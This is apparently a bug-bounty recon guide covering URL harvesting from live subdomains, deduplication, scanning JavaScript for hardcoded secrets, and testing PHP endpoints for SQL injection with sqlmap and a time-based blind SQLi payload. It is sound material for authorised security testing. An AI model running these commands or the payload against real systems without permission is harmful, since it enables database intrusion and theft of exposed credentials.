# 🌍 URL Extraction & Processing

This document details the **extraction, cleaning, and processing of URLs** from live subdomains for further security testing.

---

## **1️⃣ Extracting URLs from Live Hosts**

Once subdomains have been explored, extract all possible URLs for further analysis.

### **Commands:**
```bash
cat httpx_200.txt | xargs -I {} gau --blacklist png,jpg,gif,svg,css,woff,ttf,ico --threads 10 {} >> urls.txt
katana -list httpx_200.txt >> urls.txt
gospider -S httpx_200.txt | sed -n 's/.*\(https:\/\/[^ ]*\)]*.*/\1/p' >> urls.txt
```
✅ **Stores all extracted URLs in `urls.txt`.**

---

## **2️⃣ Cleaning & Deduplication**

Filter out unnecessary URLs while keeping important endpoints.

### **Commands:**
```bash
cat urls.txt | anew deduped_urls.txt
cat deduped_urls.txt | uro --whitelist php js html asp > clean_urls.txt
```
✅ **Removes duplicate URLs and filters out non-essential file types.**

---

## **3️⃣ Extracting Key File Types for Further Testing**

### **Extract JavaScript Files for Secrets & API Analysis**
```bash
cat clean_urls.txt | grep -E "\.js$" >> js.txt
```
✅ **JavaScript files are analyzed for API keys, tokens, and sensitive data.**

#### **JavaScript Analysis for Secrets**
```bash
cat js.txt | mantra | tee -a mantra.txt
nuclei -l js.txt -t nuclei-templates/http/exposures/ -o nucleijs.txt
```
✅ **Finds hardcoded secrets, API keys, and sensitive information in JavaScript files.**

---

### **Extract PHP Files for SQL Injection Testing**
```bash
cat clean_urls.txt | grep -E "\.php$" >> php.txt
```
✅ **PHP endpoints are tested for SQL injection vulnerabilities.**

#### **Finding Parameters in PHP Endpoints**
```bash
arjun -i php.txt | tee -a parameters.txt
```
✅ **Identifies hidden parameters in PHP endpoints.**

#### **SQL Injection Testing on Extracted PHP URLs**
```bash
sqlmap -m php.txt --dbs --banner --batch --random-agent
```
Or manually test SQLi payloads:
```sql
id = 1'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```
✅ **Tests for SQL injection vulnerabilities in extracted PHP endpoints.**

---

## **4️⃣ Sending URLs to Vulnerability Scanners**

After cleaning, send URLs for automated vulnerability scanning.

### **Commands:**
```bash
cat clean_urls.txt | nuclei -t cves/ -o nuclei_results.txt
cat clean_urls.txt | jaeles scan -c config.yaml
acunetix --scan clean_urls.txt
```
✅ **Tests extracted URLs for known vulnerabilities using `nuclei`, `jaeles`, and `acunetix`.**

---

### **🚀 Now, extracted URLs are processed, cleaned, and ready for in-depth security testing!**

